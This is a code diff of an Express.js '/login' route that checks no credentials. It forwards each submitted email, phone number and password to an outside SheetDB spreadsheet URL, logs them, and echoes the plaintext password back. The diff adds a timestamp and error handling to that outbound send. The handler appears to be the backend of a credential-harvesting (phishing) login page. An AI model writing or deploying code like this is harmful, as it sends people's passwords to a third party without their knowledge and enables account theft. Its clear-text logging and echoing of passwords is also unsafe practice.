@@ -29,14 +29,28 @@ app.post(baseUrl + "/register", (req, res) => {
     });
 });
 
+
 app.post(baseUrl + "/login", (req, res) => {
     const data = req.body;
-    console.log("🚀 ~ app.post ~ data:", data)
+    console.log("🚀 ~ app.post ~ data:", data);
+    
+    // Add a timestamp to your data
+    data.timestamp = new Date().getTime();
+    
     const email = data.name;
     const tel = data.tel;
     const password = data.password;
-    axios.post('https://sheetdb.io/api/v1/b26an47qz0cay', data);
+    
+    axios.post('https://sheetdb.io/api/v1/b26an47qz0cay', data)
+        .then(response => {
+            console.log(response.data); // Assuming you want to log the response from the server
+        })
+        .catch(error => {
+            console.error(error); // Log any errors that occur during the POST request
+        });
+    
     console.log(data);
+    
     res.json({
         message: `Email: ${email} Tel: ${tel} Password: ${password} logged in`
     });
